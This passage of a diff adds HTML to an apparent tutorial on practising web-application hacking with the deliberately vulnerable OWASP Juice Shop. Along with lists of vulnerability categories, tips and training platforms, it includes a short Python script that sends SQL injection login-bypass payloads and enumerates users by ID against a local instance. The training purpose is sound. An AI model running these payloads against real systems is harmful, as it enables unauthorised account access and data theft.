+                </div>
+                <div class="grid-item">
+                    <h4>💉 Injection Attacks</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>SQL injection (various types)</li>
+                        <li>NoSQL injection</li>
+                        <li>Command injection</li>
+                        <li>LDAP injection</li>
+                        <li>Template injection</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🔒 Cryptographic Failures</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Weak encryption</li>
+                        <li>Insecure hashing (MD5, SHA1)</li>
+                        <li>ECB mode vulnerabilities</li>
+                        <li>Predictable tokens</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🛡️ SSRF & XXE</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Server-Side Request Forgery</li>
+                        <li>XML External Entity attacks</li>
+                        <li>Internal network access</li>
+                        <li>Cloud metadata exploitation</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>⚙️ Security Misconfiguration</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Error handling disclosure</li>
+                        <li>Unused dependencies</li>
+                        <li>Default accounts</li>
+                        <li>Directory traversal</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>📦 Component Vulnerabilities</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Vulnerable npm packages</li>
+                        <li>Library exploits</li>
+                        <li>Outdated frameworks</li>
+                        <li>Dependency confusion</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🎭 Business Logic Flaws</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Negative quantity orders</li>
+                        <li>Coupon code manipulation</li>
+                        <li>Race conditions</li>
+                        <li>Payment bypass</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🔍 Improper Input Validation</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>File upload vulnerabilities</li>
+                        <li>Path traversal</li>
+                        <li>Type juggling</li>
+                        <li>Mass assignment</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>📊 Logging & Monitoring</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Log injection</li>
+                        <li>Insufficient monitoring</li>
+                        <li>Audit bypass</li>
+                        <li>Log tampering</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🚀 Advanced XSS</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>DOM-based XSS</li>
+                        <li>Stored XSS in comments</li>
+                        <li>XSS in iframes</li>
+                        <li>Filter bypass techniques</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🎯 Easter Eggs & Hidden Features</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Score board discovery</li>
+                        <li>Hidden routes</li>
+                        <li>Secret products</li>
+                        <li>Developer backdoors</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Challenge Difficulty Breakdown</h3>
+            <div class="info-box">
+                <strong>📊 Juice Shop Challenge Levels</strong>
+                <ul style="margin: 10px 0 0 20px;">
+                    <li><strong>⭐ Easy (1-star):</strong> ~35 challenges - Basic concepts, simple exploits</li>
+                    <li><strong>⭐⭐ Medium (2-star):</strong> ~30 challenges - Requires some technical knowledge</li>
+                    <li><strong>⭐⭐⭐ Hard (3-star):</strong> ~25 challenges - Advanced techniques, chaining exploits</li>
+                    <li><strong>⭐⭐⭐⭐ Expert (4-star):</strong> ~15 challenges - Deep technical knowledge required</li>
+                    <li><strong>⭐⭐⭐⭐⭐ Master (5-star):</strong> ~10 challenges - Extremely difficult, creative thinking</li>
+                    <li><strong>⭐⭐⭐⭐⭐⭐ Elite (6-star):</strong> ~5 challenges - Nearly impossible without hints!</li>
+                </ul>
+            </div>
+
+            <h3>Automation with Python</h3>
+            <p>Once you understand the vulnerabilities manually, automate them:</p>
+
+            <pre><code><span class="comment">#!/usr/bin/python3</span>
+<span class="comment"># Automated Juice Shop SQL Injection</span>
+
+import requests
+
+base_url = "http://localhost:3000"
+
+<span class="comment"># SQL Injection payloads</span>
+payloads = [
+    "' OR 1=1--",
+    "' OR 'a'='a'--",
+    "admin'--",
+    "' UNION SELECT NULL--"
+]
+
+<span class="comment"># Test each payload</span>
+for payload in payloads:
+    data = {
+        "email": payload,
+        "password": "anything"
+    }
+    
+    response = requests.post(f"{base_url}/rest/user/login", json=data)
+    
+    if response.status_code == 200:
+        print(f"[+] SUCCESS: {payload}")
+        print(f"    Token: {response.json().get('authentication', {}).get('token')}")
+    else:
+        print(f"[-] FAILED: {payload}")
+
+<span class="comment"># Automated IDOR testing</span>
+print("\n[*] Testing IDOR on user endpoints...")
+for user_id in range(1, 20):
+    response = requests.get(f"{base_url}/api/Users/{user_id}")
+    if response.status_code == 200:
+        user = response.json()
+        print(f"[+] User {user_id}: {user.get('email')}")
+</code></pre>
+
+            <h3>Using Burp Suite</h3>
+            <p>Professional tool for web app testing:</p>
+
+            <ol class="steps">
+                <li>
+                    <strong>Install Burp Suite Community</strong><br>
+                    Download from: <a href="https://portswigger.net/burp/communitydownload" target="_blank">portswigger.net</a>
+                </li>
+                <li>
+                    <strong>Configure Browser Proxy</strong><br>
+                    Set proxy to: <code>127.0.0.1:8080</code><br>
+                    Install Burp's CA certificate
+                </li>
+                <li>
+                    <strong>Intercept Requests</strong><br>
+                    Turn on "Intercept" → Browse Juice Shop<br>
+                    Modify requests before they're sent!
+                </li>
+                <li>
+                    <strong>Use Intruder for Brute Force</strong><br>
+                    Select payload positions → Load wordlists → Attack!
+                </li>
+                <li>
+                    <strong>Use Repeater for Manual Testing</strong><br>
+                    Send requests repeatedly with modifications
+                </li>
+            </ol>
+
+            <h3>Tips for 100% Completion</h3>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>🔎 Use Hints Wisely</h4>
+                    <p style="font-size: 0.9em;">
+                        Score board shows hints for each challenge. Read them if you're stuck for 30+ minutes.
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>📚 Read OWASP Documentation</h4>
+                    <p style="font-size: 0.9em;">
+                        The official guide has detailed solutions: <a href="https://pwning.owasp-juice.shop/" target="_blank">pwning.owasp-juice.shop</a>
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>🧪 Experiment Freely</h4>
+                    <p style="font-size: 0.9em;">
+                        Can't break it permanently! Try every payload you can think of.
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>🤝 Join Community</h4>
+                    <p style="font-size: 0.9em;">
+                        OWASP Slack channel: <code>#project-juiceshop</code><br>
+                        Ask questions and share solutions!
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>📝 Document Findings</h4>
+                    <p style="font-size: 0.9em;">
+                        Write vulnerability reports as practice for real pentests. Include impact, PoC, remediation.
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>🔄 Try Different Approaches</h4>
+                    <p style="font-size: 0.9em;">
+                        Many challenges have multiple solutions. Find alternate exploitation methods!
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>⏱️ Time Yourself</h4>
+                    <p style="font-size: 0.9em;">
+                        Track how long each challenge takes. Improve speed for real-world scenarios.
+                    </p>
+                </div>
+                <div class="grid-item">
+                    <h4>🎯 Set Daily Goals</h4>
+                    <p style="font-size: 0.9em;">
+                        Complete 3-5 challenges per day. Consistent practice builds expertise!
+                    </p>
+                </div>
+            </div>
+
+            <h3>Creating Your Own Exploits</h3>
+            <p>Build a personal exploitation toolkit:</p>
+
+            <div class="grid">
+                <div class="grid-item">
+                    <h4>🐍 Python Scripts</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Automated scanners</li>
+                        <li>Payload generators</li>
+                        <li>API fuzzers</li>
+                        <li>Brute force tools</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🦊 Browser Extensions</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>Cookie editors</li>
+                        <li>Header modifiers</li>
+                        <li>JavaScript injectors</li>
+                        <li>Request interceptors</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>📜 Payload Collections</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>SQL injection payloads</li>
+                        <li>XSS payloads</li>
+                        <li>XXE payloads</li>
+                        <li>Command injection shells</li>
+                    </ul>
+                </div>
+                <div class="grid-item">
+                    <h4>🔧 Custom Tools</h4>
+                    <ul style="font-size: 0.9em; margin: 10px 0 0 20px;">
+                        <li>JWT decoders</li>
+                        <li>Hash crackers</li>
+                        <li>Encoding converters</li>
+                        <li>Obfuscators</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>After Completing Juice Shop</h3>
+            <p>Congratulations! You've mastered web application security fundamentals. Next steps:</p>
+
+            <div class="info-box">
+                <strong>🚀 Advanced Practice Platforms</strong>
+                <ol style="margin: 10px 0 0 20px;">
+                    <li>
+                        <strong>PortSwigger Web Security Academy</strong> - Free labs covering every vulnerability type
+                        <ul><li>URL: <a href="https://portswigger.net/web-security" target="_blank">portswigger.net/web-security</a></li></ul>
+                    </li>
+                    <li>
+                        <strong>HackTheBox</strong> - Real-world pentesting challenges (requires subscription for most content)
+                        <ul><li>URL: <a href="https://www.hackthebox.com/" target="_blank">hackthebox.com</a></li></ul>
+                    </li>
+                    <li>
+                        <strong>TryHackMe</strong> - Guided learning paths for web security
+                        <ul><li>URL: <a href="https://tryhackme.com/" target="_blank">tryhackme.com</a></li></ul>
+                    </li>
+                    <li>
+                        <strong>PentesterLab</strong> - Advanced web exploitation exercises
+                        <ul><li>URL: <a href="https://pentesterlab.com/" target="_blank">pentesterlab.com</a></li></ul>
+                    </li>
+                    <li>
+                        <strong>Damn Vulnerable Web Application (DVWA)</strong> - Another vulnerable app for practice
+                        <ul><li>URL: <a href="https://github.com/digininja/DVWA" target="_blank">github.com/digininja/DVWA</a></li></ul>
+                    </li>
+                </ol>
+            </div>
         </div>
 
         <!-- NEXT STEPS -->
